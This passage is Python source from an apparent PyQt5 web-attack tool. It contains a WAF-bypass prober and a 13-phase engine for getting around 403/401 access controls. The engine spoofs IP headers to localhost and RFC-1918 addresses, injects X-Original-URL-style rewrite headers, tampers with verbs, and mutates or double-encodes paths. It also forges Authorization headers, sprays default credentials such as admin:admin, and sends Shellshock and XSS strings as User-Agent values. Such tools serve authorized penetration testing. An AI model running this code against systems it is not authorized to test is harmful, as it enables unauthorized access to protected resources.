            evidence = (f"HTTP {sc} — WAF did NOT block (block={block_status}, "
                        f"baseline={b_status})")
        elif sc == 302 and sc != block_status:
            loc = getattr(resp, "headers", {}).get("Location", "")
            if loc and "login" not in loc.lower() and "error" not in loc.lower():
                is_bypass, confidence = True, "MEDIUM"
                evidence = f"HTTP 302 redirect → {loc[:60]}"

        if not is_bypass: return None
        return {"technique": tech, "url": url, "method": method,
                "headers_added": hdrs, "status_code": sc,
                "length": length, "delta_len": delta,
                "response_time": elapsed, "confidence": confidence,
                "evidence": evidence, "attack": attack[:80]}

    def _waf_run_sequential(self, probes, baseline, block_status,
                            timeout, delay) -> List[Dict]:
        results = []
        for p in probes:
            if not self.running: break
            if delay > 0: time.sleep(delay)
            f = self._waf_probe(p, baseline, block_status, timeout)
            if f: results.append(f)
        return results

    def _waf_run_parallel(self, probes, baseline, block_status,
                          timeout, delay, workers) -> List[Dict]:
        results = []
        with concurrent.futures.ThreadPoolExecutor(max_workers=workers) as exe:
            futs = {exe.submit(self._waf_probe, p, baseline,
                               block_status, timeout): p for p in probes}
            for fut in concurrent.futures.as_completed(futs):
                if not self.running: break
                try:
                    f = fut.result()
                    if f: results.append(f)
                except Exception: pass
        return results

# ─────────────────────────────────────────────────────────────────────────────
# Worker thread
# ─────────────────────────────────────────────────────────────────────────────



# ─────────────────────────────────────────────────────────────────────────────
# Access-Control Bypass Engine
# ─────────────────────────────────────────────────────────────────────────────

_LOCALHOST = [
    "127.0.0.1", "localhost", "::1", "0.0.0.0",
    "0177.0.0.1", "0x7f000001", "2130706433",
    "127.1", "127.0.1", "::ffff:127.0.0.1",
]
_IP_SPOOF_HEADERS = [
    "X-Forwarded-For","X-Real-IP","X-Originating-IP","X-Client-IP",
    "X-Remote-IP","X-Remote-Addr","X-ProxyUser-Ip","X-Original-Remote-Addr",
    "True-Client-IP","CF-Connecting-IP","Fastly-Client-IP","X-Cluster-Client-IP",
    "X-Host","X-Forwarded-Host","X-Custom-IP-Authorization","Forwarded",
    "X-Azure-ClientIP","X-Akamai-Remote-Addr",
]
# Internal RFC-1918 ranges — used in Phase 13 (last, may be slow)
_INTERNAL_IPS = [
    "192.168.1.1", "192.168.1.100", "192.168.1.254",
    "192.168.0.1", "192.168.0.100",
    "10.0.0.1",   "10.0.0.100",  "10.0.1.1",
    "172.16.0.1", "172.16.1.1",  "172.31.0.1",
    "10.10.10.10",
]
# Known valid/public paths to use as bypass anchors in Phase 12
_VALID_PATH_ANCHORS = [
    "/robots.txt",
    "/favicon.ico",
    "/assets/",
    "/static/",
    "/images/",
    "/css/",
    "/js/",
    "/public/",
]

_REWRITE_HEADERS = [
    ("X-Original-URL","/{path}"),("X-Rewrite-URL","/{path}"),
    ("X-Override-URL","/{path}"),("Referer","/{path}"),
    ("X-Forwarded-Prefix","/{path}"),("X-Forwarded-Path","/{path}"),
    ("X-Proxy-URL","/{path}"),("Request-Uri","/{path}"),
    ("X-Request-URI","/{path}"),
]
_VERBS = [
    "GET","POST","HEAD","OPTIONS","TRACE","PUT","DELETE","PATCH","POSTX",
    "CONNECT","PROPFIND","PROPPATCH","MKCOL","COPY","MOVE","LOCK",
    "UNLOCK","SEARCH","PURGE","ARBITRARY",
    "get","post","head","options",
    "GeT","pOST","PoSt","GEt","gEt","dElEtE",
]
_USER_AGENTS = [
    "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
    "AdsBot-Google (+http://www.google.com/adsbot.html)",
    "Googlebot-Image/1.0",
    "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)",
    "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)",
    "curl/7.68.0","python-requests/2.27.1","PostmanRuntime/7.28.4",
    "() { :;}; echo Content-Type: text/html","sqlmap/1.6",
    "<script>alert(1)</script>",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X)",
    "Wget/1.20.3 (linux-gnu)","Java/1.8.0_292",
]
_EXTENSIONS = [
    ".json",".html",".xml",".css",".js",".php",".asp",".aspx",
    ".txt",".md",".bak",".old",".1","~",
    "%20","%09",";",";.json",".do",".action",".jsp",
    ".cfm",".rb",".py","%00",".inc",
]
_DEFAULT_CREDS = [
    ("admin","admin"),("admin","password"),("admin","123456"),
    ("root","root"),("root","toor"),("test","test"),
    ("guest","guest"),("user","user"),("admin",""),
    ("","admin"),("administrator","administrator"),
    ("admin","admin123"),("admin","letmein"),
]

def _utf8_overlong(s: str) -> str:
    m = {"/":"%c0%af",".":"%c0%ae"," ":"%c0%a0","<":"%c0%bc",">":"%c0%be"}
    return "".join(m.get(c, c) for c in s)

def _path_mutations(path: str) -> List[Dict]:
    p = path.lstrip("/"); base = "/" + p
    segs = [s for s in p.split("/") if s]
    v: List[Dict] = []
    def a(lbl, pth): v.append({"label": lbl, "path": pth})
    a("dot-segment /%2e/",    f"/%2e/{p}")
    a("trailing-dot /.",      f"{base}/.")
    a("double-slash //",      f"//{p}//")
    a("dot-slash /./",        f"/{p}/./")
    a("trailing-slash /",     f"{base}/")
    a("random-suffix .rnd",   f"{base}/.randomstring")
    a("double-dot-semi ..;/", f"{base}..;/")
    a("question-mark ?",      f"{base}?")
    a("triple-question ???",  f"{base}???")
    a("space-encode %20",     f"{base}%20/")
    a("space-wrap %20x%20",   f"/%20{p}%20/")
    for mp in ["/%2f","/.%2f","/%20","/%09","/./","/..",
               "/.;/","/..;/","//","/*","/..%2f","/..%252f",
               "/%2e/","/%2e%2e/","/%ef%bc%8f"]:
        a(f"midpath {mp}", f"{base}{mp}")
    enc1 = urllib.parse.quote(urllib.parse.quote(p))
    enc2 = urllib.parse.quote(enc1)
    a("double-encode", "/" + enc1); a("triple-encode", "/" + enc2)
    if p:
        if p.upper() != p: a("path-upper", "/" + p.upper())
        if p.lower() != p: a("path-lower", "/" + p.lower())
        mixed = "".join(c.upper() if i%2==0 else c.lower() for i,c in enumerate(p))
        a("path-mixedcase", "/" + mixed)
    a("overlong-slash", "/" + p.replace("/","%c0%af"))
    fw = "".join(chr(0xFF01+ord(c)-0x21) if 0x21<=ord(c)<=0x7E else c for c in p)
    a("unicode-fullwidth", "/" + fw)
    for ep in ["/../","/./","/../.","/.%2e/","/%2e./"]:
        a(f"end-path {ep}", f"{base}{ep}")
    if segs:
        last = segs[-1]
        pre  = ("/" + "/".join(segs[:-1])) if len(segs)>1 else ""
        a("seg-dot-suffix", f"{pre}/{last}.")
        a("seg-semicolon",  f"{pre}/{last};/")
        a("seg-slash-dot",  f"{pre}/{last}/.")
        a("seg-null-byte",  f"{pre}/{last}%00")
        a("seg-hash",       f"{pre}/{last}#bypass")
        a("seg-at",         f"{pre}/{last}@{last}")
    return v

class BypassScanMixin:
    """403/401/405 access-control bypass — 13 phases, ~400 probes."""

    def scan_bypass(self) -> Dict[str, Any]:
        rd      = self.request_data
        url     = rd.get("url","")
        method  = (rd.get("method") or "GET").upper()
        hdrs    = self._bypass_build_headers(rd)
        body    = rd.get("body") or rd.get("request_body") or ""
        # Fallback: extract body from raw request_text when the body key is absent
        if not body:
            _rt = rd.get("request_text", "")
            if _rt:
                _rt_lines = _rt.replace("\r\n", "\n").split("\n")
                _blank = next((i for i, l in enumerate(_rt_lines) if not l.strip()), -1)
                if _blank != -1 and _blank + 1 < len(_rt_lines):
                    body = "\n".join(_rt_lines[_blank + 1:]).strip()
        timeout = getattr(self,"scan_timeout",15)
        delay   = getattr(self,"scan_req_delay",0.0)
        workers = getattr(self,"scan_max_workers",6) if getattr(self,"boost_mode",False) else 1

        parsed     = urllib.parse.urlparse(url)
        origin     = f"{parsed.scheme}://{parsed.netloc}"
        path       = parsed.path or "/"
        clean_path = path.lstrip("/")
        query      = ("?" + parsed.query) if parsed.query else ""
        base_no_qs = origin + path

        findings: List[Dict] = []
        stats = {"phases_run":0,"payloads_sent":0,"bypasses_found":0}

        self.scan_progress.emit(f"🛡  [Bypass] Starting 403/401 access-control bypass (13 phases) — {url[:80]}")

        b_status, b_len, b_time = self._bypass_baseline(url, method, hdrs, body, timeout)
        stats["phases_run"] += 1; stats["payloads_sent"] += 1
        self.scan_progress.emit(f"🛡  [Bypass] Baseline → HTTP {b_status}  {b_len}b  {b_time:.2f}s")
        if b_status not in (401,403,405,407,429):
            self.scan_progress.emit(f"⚠️  [Bypass] Baseline {b_status} is not a 4xx block — continuing anyway.")
        baseline = {"status":b_status,"length":b_len,"time":b_time}

        def _run(num, label, probes):
            if not self.running or not probes: return
            self.scan_progress.emit(f"🛡  [Bypass] Phase {num} — {label} ({len(probes)} probes)")
            stats["phases_run"] += 1; stats["payloads_sent"] += len(probes)
            runner = (self._bypass_parallel if workers>1 else self._bypass_sequential)
            args   = (probes, baseline, b_status, timeout, delay)
            new_f  = runner(*args) if workers<=1 else runner(*args, workers)
            for f in new_f: f["phase"] = f"{num} – {label}"
            findings.extend(new_f); stats["bypasses_found"] += len(new_f)
            if new_f:
                self.scan_progress.emit(f"  ✅ [Bypass] Phase {num}: {len(new_f)} bypass(es) found!")

        p1 = []
        for h in _IP_SPOOF_HEADERS:
            for ip in _LOCALHOST[:5]:
                p1.append({"url":url,"method":method,"headers":_merge_headers(hdrs,{h:ip}),"body":body,"technique":f"{h}: {ip}"})
        p1.append({"url":url,"method":method,"headers":_merge_headers(hdrs,{"Forwarded":"for=127.0.0.1;proto=http;by=127.0.0.1"}),"body":body,"technique":"Forwarded: for=127.0.0.1 (RFC7239)"})
        _run(1,"IP-Spoof Headers",p1)

        p2 = []

        # ── Referer candidates ────────────────────────────────────────────
        # Extract the original Referer origin from the request headers
        # (may differ from the target host, e.g. www.example.com vs api.example.com)
        orig_referer = ""
        for _k, _v in hdrs.items():
            if _k.lower() == "referer":
                orig_referer = _v.strip()
                break
        # Extract just the origin part of the original Referer
        # e.g. "https://www.example.com/shop" → "https://www.example.com"
        orig_referer_origin = ""
        if orig_referer:
            try:
                _rp = urllib.parse.urlparse(orig_referer)
                if _rp.scheme and _rp.netloc:
                    orig_referer_origin = f"{_rp.scheme}://{_rp.netloc}"
            except Exception:
                pass

        path_segs   = [s for s in path.split("/") if s]
        parent_path = ("/" + "/".join(path_segs[:-1])) if len(path_segs) > 1 else "/"
        admin_paths = ["/admin", "/administrator", "/management"]

        # Collect all bases to combine with paths:
        # 1. target origin  (e.g. https://host)
        # 2. original Referer origin if different  (e.g. https://www.host)
        _bases = [origin]
        if orig_referer_origin and orig_referer_origin != origin:
            _bases.append(orig_referer_origin)

        referer_values = []

        # Target path — relative and full URL with each base
        referer_values.append(path)
        for _b in _bases:
            referer_values.append(_b + path)

        # Parent directory — relative and full URL with each base
        referer_values.append(parent_path)
        for _b in _bases:
            referer_values.append(_b + parent_path)

        # Admin paths — relative, then full URL with each base
        for ap in admin_paths:
            # Only skip if the target IS exactly this path or a true sub-path of it
            # e.g. /admin-roles does NOT start with /admin/ so should NOT be skipped
            if path == ap or path.startswith(ap + "/"):
                continue
            referer_values.append(ap)           # /admin  (relative)
            for _b in _bases:
                referer_values.append(_b + ap)  # https://host/admin  AND  https://orig-referer-host/admin

        # Deduplicate while preserving order
        _seen_rv: set = set()
        unique_referer_values = []
        for rv in referer_values:
            if rv not in _seen_rv:
                _seen_rv.add(rv)
                unique_referer_values.append(rv)

        # Add Referer probes — replace existing Referer header case-insensitively
        for rv in unique_referer_values:
            p2.append({
                "url": origin + path + query,
                "method": method,
                "headers": _merge_headers(hdrs, {"Referer": rv}),
                "body": body,
                "technique": f"Referer: {rv}"
            })
        # All other rewrite/override headers (X-Original-URL, X-Rewrite-URL, etc.)
        for h, tpl in _REWRITE_HEADERS:
            if h == "Referer":   # already handled above with full variants
                continue
            v = tpl.replace("{path}", clean_path)
            p2.append({
                "url": origin + path + query,
                "method": method,
                "headers": _merge_headers(hdrs, {h: v}),
                "body": body,
                "technique": f"{h}: {v}"
            })

        p2.append({"url":origin+path+"anything"+query,"method":method,
                   "headers":_merge_headers(hdrs,{"X-Original-URL":"/"+clean_path}),
                   "body":body,"technique":"path+anything + X-Original-URL"})
        _run(2,"Rewrite / Override Headers",p2)

        p3 = []

        # Methods that carry data in the URL (no body expected)
        _GET_LIKE  = {"GET", "HEAD", "OPTIONS", "TRACE", "CONNECT", "POSTX",
                      "get", "head", "options", "trace",
                      "GeT", "pOST", "PoSt", "GEt", "gEt"}
        # Methods that carry data in the body
        _POST_LIKE = {"POST", "PUT", "PATCH"}

        # ── Pre-compute body params as a query string (POST→GET conversion) ──
        _body_qs = ""
        if body.strip():
            try:
                if body.strip().startswith("{"):
                    _jd = json.loads(body.strip())
                    _body_qs = urllib.parse.urlencode(
                        {k: (v if isinstance(v, str) else json.dumps(v))
                         for k, v in _jd.items()})
                else:
                    _bq = urllib.parse.parse_qs(body.strip(), keep_blank_values=True)
                    _body_qs = urllib.parse.urlencode(
                        {k: v[0] for k, v in _bq.items()})
            except Exception:
                _body_qs = ""

        # ── Pre-compute URL query params as a body string (GET→POST conversion) ──
        _url_qs = urllib.parse.urlparse(url).query   # already percent-encoded
        _url_base = url.split("?")[0]                # URL without query string

        for verb in _VERBS:
            if verb.upper() == method and verb == method:
                continue
            verb_upper = verb.upper()

            # POST/PUT/PATCH → GET-like: move body params into URL query string
            if (method.upper() in _POST_LIKE
                    and verb_upper in {"GET", "HEAD", "OPTIONS", "TRACE"}
                    and _body_qs):
                existing_q = urllib.parse.urlparse(url).query
                new_q      = (existing_q + "&" + _body_qs) if existing_q else _body_qs
                new_url    = url.split("?")[0] + "?" + new_q
                # Drop Content-Type — no body is sent
                new_hdrs = {k: v for k, v in hdrs.items()
                            if k.lower() not in ("content-type",)}
                p3.append({"url": new_url, "method": verb, "headers": new_hdrs,
                           "body": "", "technique": f"Verb: {verb} (body→query params)"})

            # GET-like → POST/PUT/PATCH: move URL query params into body
            elif (method.upper() not in _POST_LIKE
                      and verb_upper in _POST_LIKE
                      and _url_qs):
                # Variant 1 — with Content-Type: application/x-www-form-urlencoded
                hdrs_ct = {**hdrs, "Content-Type": "application/x-www-form-urlencoded"}
                p3.append({"url": _url_base, "method": verb, "headers": hdrs_ct,
                           "body": _url_qs,
                           "technique": f"Verb: {verb} (query→body, with CT)"})
                # Variant 2 — without Content-Type header
                hdrs_no_ct = {k: v for k, v in hdrs.items()
                              if k.lower() != "content-type"}
                p3.append({"url": _url_base, "method": verb, "headers": hdrs_no_ct,
                           "body": _url_qs,
                           "technique": f"Verb: {verb} (query→body, no CT)"})

            else:
                # All other verb switches — keep body/URL as-is
                p3.append({"url": url, "method": verb, "headers": hdrs,
                           "body": body, "technique": f"Verb: {verb}"})

        _run(3,"Verb Tampering + Case Switching",p3)

        _run(4,"Path Mutations (50+ variants)",
             [{"url":origin+m["path"]+query,"method":method,"headers":hdrs,"body":body,"technique":m["label"]}
              for m in _path_mutations(path)])

        p5 = []
        segs = [s for s in path.split("/") if s]
        for i,seg in enumerate(segs):
            for ev,lbl in [(urllib.parse.quote(seg,safe=""),"single-enc"),
                           (urllib.parse.quote(urllib.parse.quote(seg,safe=""),safe=""),"double-enc")]:
                np = "/"+"/".join(segs[:i]+[ev]+segs[i+1:])
                p5.append({"url":origin+np+query,"method":method,"headers":hdrs,"body":body,"technique":f"{lbl} seg[{i}]={seg}"})
        if not p5:
            p5.append({"url":origin+"%2F"+query,"method":method,"headers":hdrs,"body":body,"technique":"encode-root-slash"})
        _run(5,"Double / Triple URL Encoding",p5)

        _run(6,"HTTP Version Switching",[
            {"url":url,"method":method,"headers":{**hdrs,"X-HTTP-Version-Override":"HTTP/1.0"},"body":body,"technique":"HTTP/1.0 header override"},
            {"url":url,"method":method,"headers":{**hdrs,"Connection":"close"},"body":body,"technique":"Connection: close"},
            {"url":url,"method":method,"headers":{**hdrs,"Upgrade":"h2c"},"body":body,"technique":"Upgrade: h2c"},
        ])

        _run(7,"User-Agent Rotation",
             [{"url":url,"method":method,"headers":{**hdrs,"User-Agent":ua},"body":body,"technique":f"UA: {ua[:60]}"}
              for ua in _USER_AGENTS])

        _run(8,"Extension Suffix Bypass",
             [{"url":base_no_qs+ext+(query or ""),"method":method,"headers":hdrs,"body":body,"technique":f"ext: {ext}"}
              for ext in _EXTENSIONS])

        _run(9,"Auth Header Forgery",
             [{"url":url,"method":method,"headers":{**hdrs,hn:hv},"body":body,"technique":f"{hn}: {hv[:50]}"}
              for hn,hv in [
                ("Authorization","Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.e30.LwimMJA3puF360uW4jZoKL-Ll8YMVTFIs2M7oIIFbhs"),
                ("Authorization","Basic "+base64.b64encode(b"admin:admin").decode()),
                ("Authorization","Basic "+base64.b64encode(b"admin:").decode()),
                ("Authorization","Negotiate"),("Authorization","NTLM"),
                ("X-Auth-Token","0"),("X-API-Key","undefined"),
                ("X-API-Key","null"),("X-API-Key","admin"),
                ("Authorization","Bearer null"),("Authorization","Bearer 0"),
              ]])

        _run(10,"Default Credentials",
             [{"url":url,"method":method,
               "headers":{**hdrs,"Authorization":"Basic "+base64.b64encode(f"{u}:{p}".encode()).decode()},
               "body":body,"technique":f"cred {u}:{p}"}
              for u,p in _DEFAULT_CREDS])

        ch = {**hdrs,"X-Forwarded-For":"127.0.0.1","X-Original-URL":"/"+clean_path,
              "X-Custom-IP-Authorization":"127.0.0.1","X-Real-IP":"127.0.0.1"}
        _run(11,"Combo (IP-header + path stacked)",
             [{"url":origin+mp+query,"method":method,"headers":ch,"body":body,"technique":lbl}
              for lbl,mp in [
                ("combo /%2e/path",  f"/%2e/{clean_path}"),
                ("combo //path//",   f"//{clean_path}//"),
                ("combo /path/",     f"{path}/"),
                ("combo path..;/",   f"{path}..;/"),
                ("combo path%00",    f"{path}%00"),
              ]])

        # ── Phase 12 — Valid-path prefix bypass ──────────────────────────
        # Use a known-valid path as a "trusted" prefix, then traverse to the
        # blocked resource.  e.g. /robots.txt/..;/admin/  → server may allow
        # it because the prefix resolves to a public path first.
        p12 = []
        for anchor in _VALID_PATH_ANCHORS:
            # Determine suffix separator: files (no trailing /) need no extra /
            anchor_no_slash = anchor.rstrip("/")
            anchor_is_file  = not anchor.endswith("/")

            # Pattern A: /anchor/..;/blocked_path/
            p12.append({
                "url":     origin + anchor_no_slash + "/..;" + path + "/",
                "method":  method, "headers": hdrs, "body": body,
                "technique": f"prefix {anchor_no_slash}/..;{path}/",
            })
            # Pattern B: /anchor/../blocked_path
            p12.append({
                "url":     origin + anchor_no_slash + "/../" + clean_path,
                "method":  method, "headers": hdrs, "body": body,
                "technique": f"prefix {anchor_no_slash}/../{clean_path}",
            })
            # Pattern C: /anchor../blocked_path/ (dot after anchor, no slash)
            p12.append({
                "url":     origin + anchor_no_slash + ".." + path + "/",
                "method":  method, "headers": hdrs, "body": body,
                "technique": f"prefix {anchor_no_slash}..{path}/",
            })
            # Pattern D: /anchor..;/blocked_path/
            p12.append({
                "url":     origin + anchor_no_slash + "..;" + path + "/",
                "method":  method, "headers": hdrs, "body": body,
                "technique": f"prefix {anchor_no_slash}..;{path}/",
            })
            # Pattern E: /anchor/%2e%2e/blocked_path (URL-encoded dots)
            p12.append({
                "url":     origin + anchor_no_slash + "/%2e%2e/" + clean_path,
                "method":  method, "headers": hdrs, "body": body,
                "technique": f"prefix {anchor_no_slash}/%2e%2e/{clean_path}",
            })
            # Pattern F: /anchor/%2e%2e;/blocked_path/
            p12.append({
                "url":     origin + anchor_no_slash + "/%2e%2e;/" + clean_path + "/",
                "method":  method, "headers": hdrs, "body": body,
                "technique": f"prefix {anchor_no_slash}/%2e%2e;/{clean_path}/",
            })
        _run(12, "Valid-path Prefix Bypass (/robots.txt/..;/path/)", p12)

        # ── Phase 13 — Internal-IP Spoofing (RFC-1918, all headers) ──────
        # Tries every IP-spoof header with private-network IPs in addition
        # to localhost.  Kept last because the matrix is large.
        p13 = []
        for h in _IP_SPOOF_HEADERS:
            for ip in _INTERNAL_IPS:
                p13.append({
                    "url": url, "method": method, "body": body,
                    "headers": _merge_headers(hdrs, {h: ip}),
                    "technique": f"internal-IP {h}: {ip}",
                })
        # Also try multi-hop XFF chains with internal IPs
        for ip in _INTERNAL_IPS[:5]:
            chain = f"127.0.0.1, {ip}, 10.0.0.1"
            p13.append({
                "url": url, "method": method, "body": body,
                "headers": _merge_headers(hdrs, {"X-Forwarded-For": chain}),
                "technique": f"XFF chain: {chain}",
            })
        # Combine internal IP with X-Original-URL rewrite (stacked)
        for ip in _INTERNAL_IPS[:4]:
            p13.append({
                "url": url, "method": method, "body": body,
                "headers": _merge_headers(hdrs, {
                    "X-Forwarded-For": ip,
                    "X-Custom-IP-Authorization": ip,
                    "X-Original-URL": "/" + clean_path,
                }),
                "technique": f"internal-IP stacked {ip} + X-Original-URL",
            })
        _run(13, "Internal-IP Range Spoofing (RFC-1918, all headers)", p13)

        seen: set = set(); deduped = []
        for f in findings:
            k=(f.get("status_code"),f.get("length"))
            if k not in seen: seen.add(k); deduped.append(f)
        findings = deduped
        findings.sort(key=lambda f:{"HIGH":0,"MEDIUM":1,"LOW":2}.get(f.get("confidence","LOW"),9))

        is_vuln = len(findings) > 0
        summary = (f"{'⚠️ BYPASS FOUND' if is_vuln else '✓ No bypass found'}  |  "
                   f"Phases: {stats['phases_run']}  |  Sent: {stats['payloads_sent']}  |  "
                   f"Bypasses: {len(findings)}")
        self.scan_progress.emit(f"🛡  [Bypass] Done — {summary}")
        return {"vulnerable":is_vuln,"summary":summary,"stats":stats,
                "baseline":baseline,"findings":findings}

    def _bypass_build_headers(self, rd: Dict) -> Dict[str, str]:
        hdrs: Dict[str,str] = {}
        for line in rd.get("request_text","").split("\n")[1:]:
            s = line.rstrip("\r\n")
            if not s: break
            if ":" in s:
                k,v = s.split(":",1)
                if k.strip().lower() not in ("content-length","transfer-encoding"):
                    hdrs[k.strip()] = v.strip()
        for k,v in (rd.get("headers") or {}).items():
            if k.lower() not in ("content-length","transfer-encoding"):
                hdrs[k] = v
        return hdrs

    def _bypass_baseline(self, url, method, headers, body, timeout):
        try:
            start = time.time()
            resp  = self.send_request_with_traffic(url, headers, method=method, body=body,
                        payload="[Bypass-Baseline]", payload_type="Bypass-Baseline", allow_redirects=False)
            elapsed = round(time.time()-start,3)
            return resp.status_code, len(resp.content or b""), elapsed
        except Exception as e:
            self.scan_progress.emit(f"⚠️  [Bypass] Baseline error: {e}")
            return 403, 0, 0.0

    def _bypass_probe(self, probe: Dict, b_status: int, b_len: int, timeout: int) -> Optional[Dict]:
        if not self.running: return None
        url,method = probe["url"], probe.get("method","GET")
        hdrs,body  = probe.get("headers",{}), probe.get("body","")
        tech       = probe.get("technique","")
        try:
            start = time.time()
            resp  = self.send_request_with_traffic(url, hdrs, method=method, body=body,
                        payload=tech[:80], payload_type="Bypass", allow_redirects=False)
            elapsed = round(time.time()-start,3)
            sc,length = resp.status_code, len(resp.content or b"")
            delta = length - b_len
        except Exception: return None
        # Common block / error codes — a probe returning one of these is NOT a bypass
        _BLOCK_CODES = {400, 401, 403, 405, 406, 407, 429, 503}
        is_bypass, confidence, evidence = False, "LOW", ""

        if b_status not in _BLOCK_CODES:
            # Baseline was NOT a block — nothing to bypass
            pass
        elif 200 <= sc <= 299:
            # Probe got clear 2xx — access was granted
            is_bypass, confidence = True, "HIGH"
            evidence = f"HTTP {sc} — access granted (baseline was {b_status})"
        elif sc == 302:
            # 302 redirect only counts if it’s NOT pointing back at a login / error page
            loc = getattr(resp, "headers", {}).get("Location", "")
            if loc and "login" not in loc.lower() and "error" not in loc.lower():
                is_bypass, confidence = True, "MEDIUM"
                evidence = f"HTTP 302 redirect → {loc[:60]}"
        # Same status = still blocked — do NOT flag as bypass regardless of body size.
        # Body length naturally varies (timestamps, session tokens, dynamic content).
        if not is_bypass: return None
        return {"technique":tech,"url":url,"method":method,"headers_added":hdrs,
                "status_code":sc,"length":length,"delta_len":delta,
                "response_time":elapsed,"confidence":confidence,"evidence":evidence}

    def _bypass_sequential(self, probes, baseline, b_status, timeout, delay) -> List[Dict]:
        results = []; bl = baseline.get("length",0)
        for p in probes:
            if not self.running: break
            if delay>0: time.sleep(delay)
            f = self._bypass_probe(p, b_status, bl, timeout)
            if f: results.append(f)
        return results

    def _bypass_parallel(self, probes, baseline, b_status, timeout, delay, workers) -> List[Dict]:
        results = []; bl = baseline.get("length",0)
        with concurrent.futures.ThreadPoolExecutor(max_workers=workers) as exe:
            futs = {exe.submit(self._bypass_probe, p, b_status, bl, timeout): p for p in probes}
            for fut in concurrent.futures.as_completed(futs):
                if not self.running: break
                try:
                    f = fut.result()
                    if f: results.append(f)
                except Exception: pass
        return results

class BypassWorker(QThread):
    probe_sent    = pyqtSignal(object)
    progress_msg  = pyqtSignal(str)
    scan_finished = pyqtSignal(dict)
    scan_error    = pyqtSignal(str)

    def __init__(self, request_data: Dict, waf_config: Dict,
                 scan_mode: str = 'waf', parent=None):
        super().__init__(parent)
        self.request_data = request_data
        self.waf_config   = waf_config
        self.scan_mode    = scan_mode
        self.running      = True
        self._probe_index = 0

    def run(self):
        try:
            # ── Import WafScanMixin from waf_scan.py in the same directory ───
            # waf_scan.py is a standalone file — only stdlib + requests.
            # Place it in the same folder as waf_bypass_tab.py.
            urllib3.disable_warnings()
            worker = self

            class _Scanner(WafScanMixin, BypassScanMixin):
                def __init__(self, w, rd):
                    self._worker          = w
                    self.request_data     = rd
                    self.running          = True
                    self.boost_mode       = w.waf_config.get("boost_mode", False)
                    self.scan_timeout     = w.waf_config.get("timeout", 20)
                    self.scan_req_delay   = w.waf_config.get("delay", 0.1)
                    self.scan_max_workers = w.waf_config.get("workers", 1)
                    self.scan_allow_redirects = w.waf_config.get("follow_redirects", False)
                    self.scan_verify_ssl  = w.waf_config.get("verify_ssl", False)
                    self._traffic: List[ProbeEntry] = []

                    class _Sig:
                        def __init__(self, w): self._w = w
                        def emit(self, msg): self._w.progress_msg.emit(str(msg))
                    self.scan_progress = _Sig(w)

                def send_request_with_traffic(self, url, headers, method="GET",
                                              body="", payload="",
                                              payload_type="Probe",
                                              allow_redirects=False):
                    if not self._worker.running:
                        raise RuntimeError("Scan stopped")
                    start = time.time()
                    try:
                        resp = requests.request(
                            method, url, headers=headers,
                            data=body.encode("utf-8") if isinstance(body, str) else body,
                            verify=getattr(self, "scan_verify_ssl", False),
                            timeout=self.scan_timeout,
                            allow_redirects=getattr(self, "scan_allow_redirects", allow_redirects),
                        )
                    except Exception as e:
                        class _Dummy:
                            status_code = 0
                            content = b""
                            headers = {}
                        resp = _Dummy()
                        self.scan_progress.emit(f"⚠ Request failed: {e}")
                    elapsed = round(time.time() - start, 3)
                    entry = ProbeEntry(
                        index=self._worker._probe_index,
                        method=method, url=url,
                        technique=(payload_type + ": " + payload[:60]) if payload else payload_type,
                        status_code=resp.status_code,
                        length=len(resp.content or b""),
                        elapsed=elapsed,
                        bypassed=False, confidence="", evidence="",
                        request_headers=dict(headers),
                        request_body=body[:4096] if body else "",
                        response_body=(resp.content or b"")[:8192].decode("utf-8", errors="replace"),
                        response_headers=dict(getattr(resp, "headers", {})),
                    )
                    self._worker._probe_index += 1
                    self._traffic.append(entry)
                    self._worker.probe_sent.emit(entry)
                    return resp

            scanner = _Scanner(self, self.request_data)
            if self.scan_mode == 'ac':
                result = scanner.scan_bypass()
                result.setdefault('waf_info', {})
                result.setdefault('baseline', {})
                result.setdefault('stats', {})
            else:
                result = scanner.scan_waf(self.waf_config)
            # Expose baseline length so the UI length-diff filter can use it
            self._baseline_len = result.get("baseline", {}).get("length", 0)

            # Mark bypassed entries in-place (no re-emit — avoids duplicates)
            bypass_techs = {f.get("technique", "")[:40] for f in result.get("findings", [])}
            for entry in scanner._traffic:
                for bt in bypass_techs:
                    if bt and bt in entry.technique[:40]:
                        entry.bypassed   = True
                        entry.confidence = next(
                            (f["confidence"] for f in result["findings"]
                             if f.get("technique","")[:40] == bt), "MEDIUM")
                        break

            self.scan_finished.emit(result)

        except Exception as e:
            logger.exception("WAF bypass scan error")
            self.scan_error.emit(str(e))

    def stop(self):
        self.running = False


# ─────────────────────────────────────────────────────────────────────────────
# Helpers for sortable traffic table
# ─────────────────────────────────────────────────────────────────────────────

class NumericTableWidgetItem(QTableWidgetItem):
    """QTableWidgetItem that sorts numerically when the value is a number."""
    def __lt__(self, other: QTableWidgetItem) -> bool:
        try:
            return float(self.text()) < float(other.text())
        except (ValueError, TypeError):
            return super().__lt__(other)


# ─────────────────────────────────────────────────────────────────────────────
# Request Config Dialog
# ─────────────────────────────────────────────────────────────────────────────

from PyQt5.QtWidgets import QDialog, QFormLayout, QDialogButtonBox

class RequestConfigDialog(QDialog):
    """General request settings shared by both WAF and Access-Control bypass modes."""

    _PRESETS: Dict[str, Dict] = {
        "Fast":   {"timeout": 10, "delay": 0.0},
        "Normal": {"timeout": 20, "delay": 0.1},
        "Slow":   {"timeout": 30, "delay": 0.5},
    }

    def __init__(self, cfg: dict, parent=None):
        super().__init__(parent)
        self.setWindowTitle("⚙  Request Configuration")
        self.setMinimumWidth(390)
        self.setWindowFlags(self.windowFlags() & ~Qt.WindowContextHelpButtonHint)

        root = QVBoxLayout(self)
        root.setSpacing(10)
        root.setContentsMargins(14, 14, 14, 14)

        # ── Speed presets ────────────────────────────────────────────────
        preset_grp = QGroupBox("Speed Preset")
        preset_row = QHBoxLayout(preset_grp)
        preset_row.setSpacing(8)
        self._preset_btns: Dict[str, QPushButton] = {}
        for name in ("Fast", "Normal", "Slow"):
            btn = QPushButton(name)
            btn.setCheckable(True)
            btn.setFixedHeight(28)
            btn.clicked.connect(lambda _, n=name: self._apply_preset(n))
            self._preset_btns[name] = btn
            preset_row.addWidget(btn)
        root.addWidget(preset_grp)

        # ── Timeout / Delay ──────────────────────────────────────────────
